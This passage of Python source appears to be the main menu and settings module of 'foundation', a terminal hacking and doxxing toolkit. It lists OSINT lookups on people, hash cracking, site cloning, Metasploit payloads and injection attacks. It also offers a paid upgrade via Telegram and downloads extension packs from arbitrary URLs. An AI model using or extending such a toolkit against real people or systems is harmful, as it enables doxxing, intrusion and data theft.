        "5": ("custom palette", "active" if cfg["theme"] == "custom" else "inactive"),
        "6": ("font", cfg.get("font", "default")),
        "7": ("border", cfg.get("border", "double")),
        "8": ("glyphs", cfg.get("glyphs", "unicode")),
        "9": ("density", cfg.get("density", "normal")),
        "a": ("logo", cfg.get("logo", "block")),
        "c": ("colour mode", cfg.get("color_mode", "truecolor")),
        "d": ("clock", "on" if cfg.get("show_clock") else "off"),
        "e": ("accent", cfg.get("accent") or "auto"),
        "f": ("http timeout", f"{cfg['timeout']}s"),
        "r": ("save reports", "on" if cfg["save_reports"] else "off"),
    }


SETTINGS_SECTIONS = (
    ("appearance", ("1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "c", "d", "e")),
    ("runtime", ("f", "r")),
    ("tools + maintenance", (
        ("s", "preview everything"),
        ("k", "api keys / relay"),
        ("u", f"check updates  ({UPDATE_REPO})"),
        ("z", "reset defaults"),
        ("0", "back"),
    )),
)


def cmd_settings(nf):
    # dispatched as fn(module); also callable directly with a settings dict
    cfg = getattr(nf, "CFG", nf) if not isinstance(nf, dict) else nf
    while True:
        clear()
        show_header("customization")
        labels = settings_labels(cfg)
        for title, keys in SETTINGS_SECTIONS:
            section(title)
            for key in keys:
                if isinstance(key, tuple):
                    letter, name = key
                    kv(f"{letter}  {name}", "")
                else:
                    name, value = labels[key]
                    kv(f"{key}  {name}", value)
        choice = ask("option (b = back)").lower()
        if choice in ("", "0"):
            save_settings(cfg)
            apply_live(cfg)
            return
        changed = True
        if choice == "1":
            cfg["animations"] = not cfg["animations"]
        elif choice == "2":
            cfg["anim_style"] = cycle(cfg, "anim_style", ANIM_STYLES)
        elif choice == "3":
            val = ask("speed multiplier (0.25 - 4)", str(cfg["anim_speed"]))
            try:
                cfg["anim_speed"] = max(0.25, min(4.0, float(val)))
            except ValueError:
                note("kept previous value")
        elif choice == "4":
            pick_theme(cfg)
        elif choice == "5":
            pick_custom_colors(cfg)
        elif choice == "6":
            pick_font(cfg)
        elif choice == "7":
            cfg["border"] = cycle(cfg, "border", BORDERS)
        elif choice == "8":
            cfg["glyphs"] = cycle(cfg, "glyphs", GLYPHS)
        elif choice == "9":
            cfg["density"] = cycle(cfg, "density", DENSITIES)
        elif choice == "a":
            cfg["logo"] = cycle(cfg, "logo", LOGOS)
        elif choice == "c":
            cfg["color_mode"] = cycle(cfg, "color_mode", COLOR_MODES)
        elif choice == "d":
            cfg["show_clock"] = not cfg.get("show_clock")
        elif choice == "e":
            val = ask("accent hex (blank = auto)", cfg.get("accent") or "")
            if val == "":
                cfg["accent"] = ""
            elif is_hex(val):
                cfg["accent"] = val.lower()
            else:
                note("invalid hex - accent cleared")
                cfg["accent"] = ""
        elif choice == "f":
            val = ask("timeout seconds (2 - 60)", str(cfg["timeout"]))
            try:
                cfg["timeout"] = max(2, min(60, int(val)))
            except ValueError:
                note("kept previous value")
        elif choice == "r":
            cfg["save_reports"] = not cfg["save_reports"]
        elif choice == "s":
            preview_everything(cfg)
        elif choice == "k":
            cmd_apikeys(cfg)
        elif choice == "u":
            cmd_update(sys.modules[__name__])
        elif choice == "z":
            confirm = ask("reset everything? (y/n)", "n")
            if confirm.lower().startswith("y"):
                for k, v in DEFAULT_SETTINGS.items():
                    cfg[k] = dict(v) if isinstance(v, dict) else v
                apply_live(cfg)
            else:
                changed = False
        else:
            note(f"no option '{choice}'")
            changed = False
        apply_live(cfg)
        if changed:
            save_settings(cfg)
            loading("saved")


def preview_everything(cfg):
    """Render one sample of every configured element."""
    clear()
    show_header("preview")
    section("palette")
    for name, fn in (("primary", P.pri), ("secondary", P.sec), ("muted", P.dim),
                     ("success", P.ok), ("warning", P.warn), ("error", P.bad)):
        print("  " + fn(f"{name:<10}") + P.grad(" gradient sample "))
    section("borders")
    tl, tr, bl, br, hz, vt = border_chars()
    inner = 46
    if hz:
        mark = " foundation // preview "
        print("  " + P.pri(tl + hz * inner + tr))
        print("  " + P.pri(vt) + P.grad(mark) + " " * max(0, inner - len(mark)) + P.pri(vt))
        print("  " + P.pri(bl + hz * inner + br))
    section("glyphs")
    print("  " + P.sec("prompt ") + P.dim(glyph("prompt")))
    print("  " + P.sec("bullet ") + P.pri(glyph("bullet")))
    print("  " + P.sec("ok     ") + P.ok(glyph("ok")))
    print("  " + P.sec("hit    ") + P.pri(glyph("hit")))
    section("results")
    finding("OK", "sample finding", "this is how output renders")
    finding("MED", "medium", "warning colours")
    finding("HIGH", "critical", "error colours")
    section("animation")
    type_out("typewriter sample line at the configured style", P.sec)
    loading("spinner sample", 0.5)
    launch_flash("launch sample")
    note("preview complete")


SETUP_STEPS = (
    ("theme", "pick a theme", pick_theme),
    ("anim_style", "animation style", None),
    ("animations", "animations on/off", None),
    ("logo", "logo style", None),
    ("border", "border style", None),
    ("density", "menu density", None),
    ("glyphs", "glyph set", None),
    ("color_mode", "colour mode", None),
)


def _setup_step(cfg, key, label, fn):
    """Run one wizard step; returns False when the operator backs out."""
    clear()
    show_header(f"setup - {label}")
    if fn:
        fn(cfg)
        return True
    if key == "animations":
        val = ask("enable animations? (y/n)", "y")
        cfg["animations"] = val.lower().startswith("y")
        return True
    opts = _ENUMS.get(key)
    if not opts:
        return True
    for i, name in enumerate(opts, 1):
        print("  " + P.pri(f"[{i}]") + " " + P.sec(name))
    val = ask(key, cfg.get(key, opts[0]))
    if val.isdigit() and 1 <= int(val) <= len(opts):
        cfg[key] = opts[int(val) - 1]
    elif val in opts:
        cfg[key] = val
    return True


def cmd_setup(nf, welcome=True):
    """Graphic-configuration wizard. Nothing is persisted until it finishes."""
    cfg = getattr(nf, "CFG", nf) if not isinstance(nf, dict) else nf
    if welcome:
        clear()
        print()
        print("  " + P.grad("  welcome to f o u n d a t i o n  "))
        print()
        print("  " + P.dim("graphics setup - changeable later in settings (9)"))
        pause("start setup")
    try:
        for key, label, fn in SETUP_STEPS:
            _setup_step(cfg, key, label, fn)
            apply_live(cfg)
    except BackException:
        note("setup cancelled")
        return False
    clear()
    show_header("setup preview")
    preview_everything(cfg)
    save_settings(cfg)
    return True


def startup_config(nf):
    """Ask on every launch: keep the current look or build a fresh one."""
    cfg = getattr(nf, "CFG", nf) if not isinstance(nf, dict) else nf
    clear()
    show_logo()
    print()
    print("  " + P.grad("  welcome to f o u n d a t i o n  "))
    print()
    print("  " + P.dim("current configuration"))
    print()
    kv("theme", cfg.get("theme", "lightblue"))
    kv("animations", ("on" if cfg.get("animations") else "off")
       + f"  ({cfg.get('anim_style', 'typewriter')})")
    kv("logo / border", f"{cfg.get('logo', 'block')} / {cfg.get('border', 'double')}")
    kv("font / density", f"{cfg.get('font', 'default')} / {cfg.get('density', 'normal')}")
    kv("glyphs / colour", f"{cfg.get('glyphs', 'unicode')} / {cfg.get('color_mode', 'truecolor')}")
    print()
    print("  " + P.pri("[1]") + " " + P.sec("use current configuration"))
    print("  " + P.pri("[2]") + " " + P.sec("create a new one"))
    print()
    try:
        val = ask("choice", "1")
    except BackException:
        # backing out of the chooser means keep what is already configured
        apply_live(cfg)
        return
    if val.strip().startswith("2"):
        cmd_setup(cfg, welcome=False)
    else:
        apply_live(cfg)


logo = """
██████▒▒█████   █    ██  ███▄    █ ▓█████▄  ▄▄▄     ▄▄▄█████▓ ██▓ ▒█████   ███▄    █
▓██   ▒▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▒██▀ ██▌▒████▄   ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █
▒████ ░▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒░██   █▌▒██  ▀█▄ ▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
░▓█▒  ░▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒░▓█▄   ▌░██▄▄▄▄██░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
░▒█░   ░ ████▓▒░▒▒█████▓ ▒██░   ▓██░░▒████▓  ▓█   ▓██▒ ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
 ▒ ░   ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒▓  ▒  ▒▒   ▓▒█░ ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
 ░       ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ▒  ▒   ▒   ▒▒ ░   ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░   ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░  ░ ░  ░   ░   ▒    ░       ▒ ░░ ░ ░ ▒     ░   ░ ░
           ░ ░     ░              ░    ░          ░  ░         ░      ░ ░           ░
                                     ░ 
"""

BANNER_ROWS = [ln for ln in logo.splitlines() if ln.strip()]
VERSION = "5.9"

PACK_PATH = os.path.join(BASE_DIR, "pack.json")
UPGRADE_URL = "https://t.me/zerostate00"


def pack_installed():
    return os.path.isfile(PACK_PATH)


def pack_info():
    try:
        with open(PACK_PATH, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def build_tag():
    if pack_info():
        return P.ok("paid")
    return P.warn("free") + P.dim("  •  upgrade: t.me/zerostate00")


def pack_entries(section):
    out = []
    for module in (tools_builder, tools_discord, tools_advanced, tools_system,
                   tools_utils, tools_osint, tools_roblox):
        table = getattr(module, "MENU", None) if module else None
        if not isinstance(table, dict):
            continue
        for item in table.get(section, []) or []:
            if (isinstance(item, (tuple, list)) and len(item) == 2
                    and callable(item[1])):
                out.append((item[0], item[1]))
    return out


def _menu(*entries):
    out = []
    for item in entries:
        if not item:
            continue
        label, fn = item
        if fn is None:
            continue
        out.append((str(len(out) + 1), label, fn))
    return out


def cmd_upgrade(nf):
    nf.section("license")
    if pack_info():
        nf.kv("build", "paid", nf.P.ok)
        nf.kv("pack", pack_info().get("version", "-"))
        return
    nf.kv("build", "free", nf.P.warn)
    nf.kv("upgrade", UPGRADE_URL)
    nf.note("opening telegram")
    try:
        webbrowser.open(UPGRADE_URL)
    except Exception:
        pass


def cmd_pack_status(nf):
    nf.section("license")
    info = pack_info()
    if not info:
        nf.kv("build", "free", nf.P.warn)
        nf.kv("upgrade", UPGRADE_URL)
        return
    nf.kv("build", "paid", nf.P.ok)
    nf.kv("pack", info.get("name", "-"))
    nf.kv("version", info.get("version", "-"))
    nf.kv("base", info.get("base", "-"))
    files = info.get("files") or {}
    nf.kv("modules", str(len(files)) if isinstance(files, dict) else "-")


def cmd_pack_install(nf):
    nf.section("install extension pack")
    try:
        import install_pack
        good, bad = install_pack.stray_packs(BASE_DIR)
    except Exception:
        good, bad = [], []
    default = good[0] if good else ""
    source = nf.ask("pack zip, url, or full path", default)
    if not source:
        nf.note("cancelled")
        return
    if bad and not good:
        nf.note("no usable pack zip found")
        for name in bad:
            nf.note(f"  {name} has no packed modules")
        return
    if source.lower().startswith(("http://", "https://")):
        nf.loading("downloading pack")
        r = nf.http(source, nf.CFG, body_limit=40_000_000,
                    timeout=max(30, nf.CFG["timeout"]))
        if r.error or r.status != 200 or not r.raw:
            nf.finding("HIGH", "download failed", r.error or f"http {r.status}")
            return
        path = os.path.join(tempfile.gettempdir(), "foundation-pack.zip")
        with open(path, "wb") as fh:
            fh.write(r.raw)
    else:
        path = source if os.path.isabs(source) else os.path.join(BASE_DIR, source)
    try:
        import install_pack
        messages = install_pack.install(path, BASE_DIR)
    except Exception as exc:
        nf.finding("HIGH", "install failed", str(exc)[:200])
        return
    for line in messages:
        nf.note(line)
    nf.finding("OK", "pack installed")
    offer_restart(nf)


def offer_restart(nf):
    if nf.ask("restart now? (y/n)", "y").lower()[:1] == "y":
        note("restarting")
        time.sleep(0.2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
        return True
    nf.note("restart later to load the change")
    return False


def cmd_pack_remove(nf):
    nf.section("remove extension pack")
    if not pack_installed():
        nf.finding("INFO", "no pack installed")
        return
    if nf.ask("remove installed pack? (y/n)", "n").lower()[:1] != "y":
        nf.note("not removed")
        return
    try:
        import install_pack
        messages = install_pack.remove(BASE_DIR)
    except Exception as exc:
        nf.finding("HIGH", "remove failed", str(exc)[:200])
        return
    for line in messages:
        nf.note(line)
    offer_restart(nf)


def _pip(nf, packages):
    cmd = [sys.executable, "-m", "pip", "install", *packages]
    nf.note("running: " + " ".join(cmd))
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    except Exception as exc:
        nf.finding("HIGH", "pip failed", str(exc)[:160])
        return False
    output = (proc.stdout or "") + (proc.stderr or "")
    for line in output.strip().splitlines()[-8:]:
        nf.note(line[:120])
    nf.finding("OK" if proc.returncode == 0 else "HIGH", "pip exit",
               str(proc.returncode))
    return proc.returncode == 0


def cmd_deps(nf):
    nf.section("dependencies")
    nf.kv("python", sys.version.split()[0])
    req = os.path.join(BASE_DIR, "requirements.txt")
    if not os.path.isfile(req):
        nf.finding("HIGH", "requirements.txt missing")
        return
    with open(req, encoding="utf-8") as fh:
        packages = [ln.strip() for ln in fh
                    if ln.strip() and not ln.strip().startswith("#")]
    for name in packages:
        nf.kv("package", name)
    if nf.ask("install requirements now? (y/n)", "y").lower()[:1] != "y":
        nf.note("not installed")
        return
    _pip(nf, ["-r", req])


OPTIONAL_PACKAGES = ["phonenumbers", "pysocks"]

def cmd_optional(nf):
    nf.section("optional packages")
    missing = []
    for name in OPTIONAL_PACKAGES:
        found = importlib.util.find_spec(name) is not None
        nf.kv(name, "installed" if found else "missing",
               nf.P.ok if found else nf.P.warn)
        if not found:
            missing.append(name)
    if not missing:
        nf.finding("OK", "nothing to install")
        return
    if nf.ask("install missing? (y/n)", "y").lower()[:1] != "y":
        nf.note("not installed")
        return
    _pip(nf, missing)


OSINT_MENU = _menu(
    ("Username Tracker", tools_osint.cmd_username),
    ("Username Variants", tools_extra.cmd_username_variants),
    ("Email Lookup", tools_osint.cmd_email),
    ("Phone Number Lookup", tools_osint.cmd_phone),
    ("IP Lookup", lambda nf: cmd_ip_lookup(nf.CFG)),
    ("Telegram @ Lookup", tools_osint.cmd_telegram),
    ("Telegram Channel Scraper", tools_advanced.cmd_telegram_channel),
    ("GitHub Recon", tools_advanced.cmd_github),
    ("Corporate Intel", tools_advanced.cmd_corporate),
    ("Shodan InternetDB", tools_extra.cmd_shodan),
    ("Subdomain Enum", tools_extra.cmd_subdomains),
    ("Discord ID Decoder", tools_extra.cmd_discord_id),
    ("Email Intel", tools_osint.cmd_email_intel),
    ("Domain Intel", tools_osint.cmd_domain_intel),
    ("IP Intel", tools_osint.cmd_ip_intel),
    ("Social Sweep", tools_osint.cmd_social_sweep),
    ("Paste Hunt", tools_osint.cmd_paste_hunt),
    ("Wallet Lookup", tools_osint.cmd_wallet_lookup),
    *pack_entries("osint"),
)

NETWORK_MENU = _menu(
    ("IP Scanner", tools_scan.cmd_ip_scanner),
    ("IP Port Scanner", tools_scan.cmd_ip_port_scanner),
    ("IP Pinger", tools_scan.cmd_ip_pinger),
    ("Nmap Scan", lambda nf: cmd_nmap(nf.CFG)),
    ("Banner Grab", tools_extra.cmd_banner),
    ("Traceroute", tools_extra.cmd_traceroute),
    ("SSL Certificate", tools_extra.cmd_ssl_cert),
    ("HTTP Headers", tools_extra.cmd_headers),
    ("DNS Recon", lambda nf: cmd_dns(nf.CFG)),
    ("WHOIS Lookup", lambda nf: cmd_whois(nf.CFG)),
    ("Packet Sniffer", lambda nf: cmd_sniff(nf.CFG)),
    ("DNSBL / Reputation", tools_advanced.cmd_dnsbl),
)

WEB_MENU = _menu(
    ("Website Cloner", tools_utils.cmd_site_clone),
    ("SQL Vulnerability Scanner", tools_scan.cmd_sqli),
    ("XSS Reflection Scanner", tools_extra.cmd_xss),
    ("LFI / Path Traversal", tools_extra.cmd_lfi),
    ("Open Redirect", tools_extra.cmd_open_redirect),
    ("Directory Brute", tools_extra.cmd_dir_brute),
    ("Robots / Sitemap", tools_extra.cmd_robots),
    ("WAF Fingerprint", tools_extra.cmd_waf),
    ("Wayback Archive", tools_extra.cmd_wayback),
    ("Website URL Scanner", tools_scan.cmd_url_scanner),
    ("Website Scanner", tools_scan.cmd_website_scanner),
    ("Subdomain Takeover", tools_advanced.cmd_takeover),
    ("Cert Transparency", tools_advanced.cmd_crtsh),
    ("Google Dorks", tools_advanced.cmd_dorks),
    ("JS Secret Harvest", tools_hunt.cmd_js_secrets),
    ("Sensitive File Sweep", tools_hunt.cmd_sensitive_files),
    ("API Surface Map", tools_hunt.cmd_api_map),
    ("Tech Stack Fingerprint", tools_osint.cmd_tech_stack),
    *pack_entries("web"),
)

UTIL_MENU = _menu(
    ("Password Decrypted Attack", tools_utils.cmd_hash_crack),
    ("Password Encrypted", tools_utils.cmd_password_encrypt),
    ("Hash File", tools_extra.cmd_hash_file),
    ("EXIF / Metadata", tools_extra.cmd_exif),
    ("Search In DataBase", tools_utils.cmd_db_search),
    ("Dark Web Links", tools_utils.cmd_darkweb),
    ("IP Generator", tools_utils.cmd_ip_generator),
    ("Hashes & Encoding", lambda nf: cmd_hash(nf.CFG)),
    ("Anonymization Software", tools_system.cmd_anonymization),
    ("Breach Check", tools_advanced.cmd_breach),
    ("CVE Lookup", tools_advanced.cmd_cve),
    ("Reverse IP", tools_advanced.cmd_reverse_ip),
    ("System / HWID", lambda nf: cmd_hwid(nf.CFG)),
    ("System Info", tools_system.cmd_info),
    ("Files / Site", tools_system.cmd_site),
)

UPDATE_MENU = _menu(
    ("Tool update", lambda nf: cmd_update(nf)),
    ("License / upgrade", lambda nf: cmd_upgrade(nf)),
    ("Activate upgrade", lambda nf: cmd_pack_install(nf)) if not pack_info() else None,
    ("Pack status", lambda nf: cmd_pack_status(nf)) if pack_info() else None,
    ("Remove pack", lambda nf: cmd_pack_remove(nf)) if pack_info() else None,
    ("Install dependencies", lambda nf: cmd_deps(nf)),
    ("Optional packages", lambda nf: cmd_optional(nf)),
    *pack_entries("extensions"),
)

DISCORD_MENU = _menu(
    ("Server Info", tools_discord.cmd_server_info),
    *pack_entries("discord"),
)

ROBLOX_MENU = _menu(
    ("User Info", tools_roblox.cmd_user_info),
    ("Id Info", tools_roblox.cmd_id_info),
    *pack_entries("roblox"),
)

HUNT_MENU = _menu(
    ("Version → CVE Audit", tools_hunt.cmd_version_audit),
    ("Exploit Lookup", tools_hunt.cmd_exploit_lookup),
    ("Hidden Parameter Discovery", tools_hunt.cmd_param_discovery),
    ("Anomaly Fuzzer", tools_hunt.cmd_fuzzer),
    ("Blind SQL Injection", tools_hunt.cmd_blind_injection),
    ("NoSQL Injection", tools_hunt.cmd_nosql),
    ("SSTI & Command Injection", tools_hunt.cmd_ssti_cmdi),
    ("SSRF / Cloud Metadata", tools_hunt.cmd_ssrf),
    ("XXE Injection", tools_hunt.cmd_xxe),
    ("Deserialization Probe", tools_hunt.cmd_deserialization),
    ("CORS Misconfig", tools_hunt.cmd_cors),
    ("Host Header Injection", tools_hunt.cmd_host_header),
    ("CRLF Injection", tools_hunt.cmd_crlf),
    ("JWT Attack Surface", tools_hunt.cmd_jwt),
    ("GraphQL Introspection", tools_hunt.cmd_graphql),
    ("Sensitive File Sweep", tools_hunt.cmd_sensitive_files),
    ("JS Secret Harvester", tools_hunt.cmd_js_secrets),
    ("Vhost Enumeration", tools_hunt.cmd_vhost),
    ("Default Credentials", tools_hunt.cmd_default_creds),
    ("IDOR Sweeper", tools_hunt.cmd_idor),
    ("Request Smuggling", tools_hunt.cmd_smuggling),
    ("S3 Bucket Enum", tools_hunt.cmd_s3_enum),
    ("API Surface Map", tools_hunt.cmd_api_map),
    ("Race Condition", tools_hunt.cmd_race),
)

ADVANCED_MENU = _menu(
    ("Google Dorks", tools_advanced.cmd_dorks),
    ("Breach Check", tools_advanced.cmd_breach),
    ("Reverse IP", tools_advanced.cmd_reverse_ip),
    ("DNSBL / Reputation", tools_advanced.cmd_dnsbl),
    ("CVE Lookup", tools_advanced.cmd_cve),
    ("CVE Intel (NVD + EPSS)", tools_osint.cmd_cve_intel),
    ("MSF Console / Payloads", lambda nf: cmd_msf(nf.CFG)),
    ("Zero-Day Hunt", lambda nf: run_submenu(nf, "hunt", HUNT_MENU)),
    ("Exploit Lookup", tools_hunt.cmd_exploit_lookup),
    *pack_entries("advanced"),
)

MENU = [
    ("1", "OSINT", lambda nf: run_submenu(nf, "osint", OSINT_MENU)),
    ("2", "Network", lambda nf: run_submenu(nf, "network", NETWORK_MENU)),
    ("3", "Web", lambda nf: run_submenu(nf, "web", WEB_MENU)),
    ("4", "Utilities", lambda nf: run_submenu(nf, "utilities", UTIL_MENU)),
    ("5", "Updates", lambda nf: run_submenu(nf, "updates", UPDATE_MENU)),
    ("6", "Discord", lambda nf: run_submenu(nf, "discord", DISCORD_MENU)),
    ("7", "Roblox", lambda nf: run_submenu(nf, "roblox", ROBLOX_MENU)),
    ("8", "Advanced", lambda nf: run_submenu(nf, "advanced", ADVANCED_MENU)),
    ("9", "Settings", lambda nf: cmd_settings(nf.CFG)),
    ("0", "Exit", None),
]


def run_submenu(me, title, entries):
    dispatch = {num: fn for num, _label, fn in entries}
    labels = {num: label for num, label, _fn in entries}
    while True:
        clear()
        show_header(title)
        print()
        for num, label, _fn in entries:
            print("  " + P.pri(f"[{num:>2}]") + " " + P.sec(label))
        print("  " + P.dim("b = back  •  ") + build_tag())
        print()
        try:
            choice = input("  " + P.pri(f"foundation/{title}") + P.dim("$ ")).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if choice.strip().lower() == "b":
            return
        if not choice:
            continue
        if choice == "0":
            note("use b to go back")
            continue
        fn = dispatch.get(choice)
        if not fn:
            launch_flash(f"unknown {choice}")
            continue
        try:
            launch_flash(labels[choice])
            fn(me)
        except BackException:
            print()
            note("back")
            return
        except KeyboardInterrupt:
            print()
            note("interrupted — back to menu")
        except Exception as exc:
            print()
            finding("HIGH", "module error", repr(exc))
        pause()

SLIM_ROWS = [
    " f o u n d a t i o n ",
    " security research bench ",
]


def logo_rows():
    style = CFG.get("logo", "block")
    if style == "none":
        return []
    if style == "slim":
        return SLIM_ROWS
    return BANNER_ROWS


def show_logo():
    rows = logo_rows()
    total = max(1, len(rows) - 1)
    for i, row in enumerate(rows):
        print("  " + P.rgb(_blend(P.pri_rgb, P.sec_rgb, i / total), row))


def show_clock():
    stamp = time.strftime("%a %d %b %Y  %H:%M:%S")
    w = min(term_width(), 76)
    pad = max(0, (w - len(stamp)) // 2)
    print(" " * pad + P.dim(stamp))


def clock_line():
    """Right-aligned clock for the menu footer, or empty when disabled."""
    if not CFG.get("show_clock"):
        return ""
    return P.dim(time.strftime("%a %d %b %Y  %H:%M:%S"))


def show_header(title):
    w = min(term_width(), 76)
    inner = w - 2
    tl, tr, bl, br, hz, vt = border_chars()
    label = f" foundation // {title} "
    if len(label) > inner - 2:
        label = label[:inner - 3] + "… "
    pad = inner - len(label)
    if hz:
        print("  " + P.pri(tl + hz * inner + tr))
        print("  " + P.pri(vt) + P.grad(label) + " " * pad + P.pri(vt))
        print("  " + P.pri(bl + hz * inner + br))
    else:
        print("  " + P.grad(label))

def show_menu():
    clear()
    show_logo()
    gaps = spacing()
    print()
    split = (len(MENU) + 1) // 2
    left = MENU[:split]
    right = MENU[split:]
    g = glyph("dot")
    colw = 26
    extra = max(0, gaps - 1)

    def fmt(item):
        num, label, _ = item
        pad = " " * gaps
        return "  " + P.pri(f"[{num:>2}]") + pad + P.sec(f"{label:<{colw - 6 - gaps}}")

    for i in range(max(len(left), len(right))):
        line = fmt(left[i]) if i < len(left) else " " * colw
        line += fmt(right[i]) if i < len(right) else ""
        print(line.rstrip())
        for _ in range(extra):
            print()
    print("  " + P.dim("─" * (min(term_width(), 74) - 2)))
    clock = clock_line()
    hint = (f"b = back {g} 0 = exit {g} 5 = updates {g} 9 = settings {g} c = config")
    if clock:
        print("  " + P.dim(hint) + "   " + clock)
    else:
        print("  " + P.dim(hint))
    print("  " + P.dim("build: ") + build_tag())
    print()


def boot():
    clear()
    show_clock()

def main():
    enable_ansi()
    P.set(CFG["theme"])
    if "--install-pack" in sys.argv:
        idx = sys.argv.index("--install-pack")
        path = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else ""
        import install_pack
        try:
            target = path or install_pack._pick(BASE_DIR)
            for line in install_pack.install(target, BASE_DIR, force="--force" in sys.argv):
                print(line)
        except Exception as exc:
            print(f"error: {exc}")
        return
    if "--remove-pack" in sys.argv:
        import install_pack
        try:
            for line in install_pack.remove(BASE_DIR):
                print(line)
        except Exception as exc:
            print(f"error: {exc}")
        return
    if "--update" in sys.argv:
        cmd_update(sys.modules[__name__], force=True)
        pause()
        return
    fast = "--no-anim" in sys.argv or "--fast" in sys.argv
    if fast:
        CFG["animations"] = False
    if "--setup" in sys.argv:
        cmd_setup(CFG)
    elif "--no-setup" not in sys.argv and sys.stdin.isatty():
        try:
            startup_config(CFG)
        except BackException:
            note("keeping current configuration")
    dispatch = {num: fn for num, _label, fn in MENU}
    labels = {num: label for num, label, _fn in MENU}
    me = sys.modules[__name__]

    while True:
        show_menu()
        try:
            choice = input("  " + P.pri("foundation@doxxed.com") + P.dim(":~$ ") + P.sec("")).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            choice = "0"
        if not choice:
            continue
        if choice.strip().lower() == "b":
            continue
        if choice.lower() == "c":
            try:
                startup_config(me)
            except BackException:
                note("back")
            continue
        if choice.lower() in ("u", "update"):
            try:
                cmd_update(me)
            except BackException:
                note("back")
            except Exception as exc:
                finding("HIGH", "update error", repr(exc))
            pause()
            continue
        if choice not in dispatch:
            launch_flash(f"unknown option {choice}")
            note("no such entry")
            pause()
            continue
        if choice == "0":
            launch_flash("closing")
            print("  " + P.dim("session closed"))
            return
        try:
            launch_flash(labels[choice])
            sleep_t(0.1)
            dispatch[choice](me)
        except BackException:
            print()
            note("back")
            continue
        except KeyboardInterrupt:
            print()
            note("interrupted — back to menu")
        except Exception as exc:
            print()
            finding("HIGH", "module error", repr(exc))
        pause()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  interrupted")
